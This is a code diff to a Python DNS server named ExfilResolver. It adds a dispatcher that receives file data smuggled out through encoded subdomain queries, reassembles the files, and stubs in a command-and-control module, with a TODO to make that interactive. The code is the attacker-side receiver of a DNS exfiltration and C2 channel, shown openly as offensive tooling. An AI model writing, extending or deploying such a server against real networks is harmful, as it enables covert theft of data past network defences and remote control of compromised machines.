@@ -18,15 +18,43 @@ class ExfilResolver(BaseResolver):
 
         # Strip the top level domains off to just handle the part relevant to us
         qname = qname.replace("." + str(self.origin), "") 
-        # print("QNAME:", qname)
 
-        if qname.split(".")[-1] is "fu":
-            return fileupload(qname)
+        # The first sub-domain will be the module
+        # file upload module
+        module = qname.split(".")[-1]
+        if module == "test": 
+            print("Running test")
+            message = "This is a test \"" 
+            reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(message)))
+            return reply
+            
+        if module == "fu":
+            return self.fileupload(request, qname)
+
+        if module == "c2":
+            return self.cnc(request, qname)
         
+        print("Module not found:", module)
+        reply.header.rcode = RCODE.NXDOMAIN
+        return reply
 
-    def fileupload(self, qname):
+    # unimplemented
+    def cnc(self, request, qname):
+        reply = request.reply()
+
+
+
+        reply.header.rcode = RCODE.NXDOMAIN
+        return reply
+    # DNS requests for this module look like this: 
+    # [data].[index].[file id].fu.[origin]
+    # OR 
+    # start-[lines].000.[file id].origin
+    def fileupload(self, request, qname):
+        reply = request.reply()
         if len(qname.split(".")) != 4:
             error = "Error: Incorrect amount of subdomains"
+            print(error)
             # reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(error)))
             reply.header.rcode = RCODE.NXDOMAIN
             return reply
@@ -50,6 +78,7 @@ class ExfilResolver(BaseResolver):
         return reply
 
     # Doing this in a seperate thread would be nice
+    # this is for checking if a fileupload is complete 
     def checkfile(self, filename):
         # this is one dense line of code
         nones = len([x for x in self.files[filename] if x is None])
@@ -80,15 +109,13 @@ if __name__ == '__main__':
     resolver = ExfilResolver(args.origin,"60s")
     logger = DNSLogger("-request,-reply",False)
 
-    try: 
-        udp_server = DNSServer(resolver, address="0.0.0.0", logger=logger)
-        udp_server.start_thread()
-    except PermissionError:
-        print("You need to be a privileged user to bind to this port")
+    udp_server = DNSServer(resolver, address="0.0.0.0", logger=logger)
+    udp_server.start_thread()
 
     tcp_server = DNSServer(resolver, address="0.0.0.0", tcp=True, logger=logger)
     tcp_server.start_thread()
 
     print("Started dns server")
+    # TODO write some interactive shit here for c2
     while udp_server.isAlive():
         time.sleep(1)
